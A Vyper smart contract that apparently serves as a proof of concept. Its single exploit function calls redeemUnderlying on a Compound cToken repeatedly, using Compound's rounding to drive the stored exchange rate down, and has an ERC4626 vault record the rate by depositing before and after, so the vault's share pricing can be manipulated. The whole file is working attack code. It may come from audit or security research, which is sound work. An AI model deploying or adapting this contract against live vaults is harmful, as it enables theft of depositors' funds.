# @version 0.3.7

from vyper.interfaces import ERC4626
from vyper.interfaces import ERC20

interface CompoundToken:
    def redeemUnderlying(redeemTokens: uint256) -> uint256: nonpayable
    def exchangeRateStored()  -> uint256: view
    def accrueInterest()  -> uint256: nonpayable


MAX_ROUNDS: constant(uint256) = 200

@external
def __init__():
    pass

@external
def exploit(ctoken: address, amt: uint256, rounds: uint256, dai: address, vault: address) -> int256:
    #ensure everything id sccrued
    CompoundToken(ctoken).accrueInterest()
    #Make the vault "witness" the exchange rate
    ERC20(dai).approve(vault, 10000**18)
    ERC4626(vault).deposit(10**18/10, self)
    exPre: int256 = convert(CompoundToken(ctoken).exchangeRateStored(), int256)
    for round in range(MAX_ROUNDS):
        if round == rounds:
            break
        #redeem some assets of amount where the rounding nature of compound can be exploited
        CompoundToken(ctoken).redeemUnderlying(amt)
    CompoundToken(ctoken).accrueInterest()
    exPost: int256 = convert(CompoundToken(ctoken).exchangeRateStored(), int256)
    #Make the vault "witness" the exchange rate again, this time its gone down
    ERC4626(vault).deposit(10**18/10, self)
    ERC4626(vault).deposit(10**18/10, self)
    return exPost - exPre
